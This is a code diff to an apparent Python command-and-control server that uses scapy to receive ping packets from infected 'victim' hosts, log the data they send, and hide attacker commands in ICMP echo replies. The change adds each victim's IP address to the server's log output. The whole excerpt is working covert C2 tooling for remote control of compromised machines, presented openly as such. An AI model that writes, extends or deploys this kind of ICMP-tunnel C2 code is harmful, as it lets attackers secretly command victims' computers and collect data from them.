@@ -34,7 +34,7 @@ def deserialize_json(json_object):
     message = json.loads(json_object)
     return message
         
-def handle_load(load, path):
+def handle_load(load, path, sender_ip):
     deserialized_load = deserialize_json(load)
     print(deserialized_load)
     victim_name = deserialized_load["h"]
@@ -45,12 +45,13 @@ def handle_load(load, path):
         return ""
 
     if("d" in deserialized_load.keys()):
-        print(f"data packet from: {victim_name}\n")
+        print(f"data packet from {victim_name}[{sender_ip}] received")
         print(f"data received: {deserialized_load['d']}\n")
+
     else:
-        print(f"keep-alive packet from: {victim_name}\n")
+        print(f"keep-alive packet from {victim_name}[{sender_ip}] received")
         command = get_victim_command(victim_name, path)
-        print(command)
+        print(f"sent command: {command}\n")
         return command
 
     return ""
@@ -65,7 +66,7 @@ def handle_ping(pkt):
             seq=pkt[2].seq
             id=pkt[2].id
             load = pkt[3].load.decode('UTF-8')
-            command = handle_load(load, path)
+            command = handle_load(load, path, src)
             if(command):
                 reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/command
                 send(reply,verbose=False)
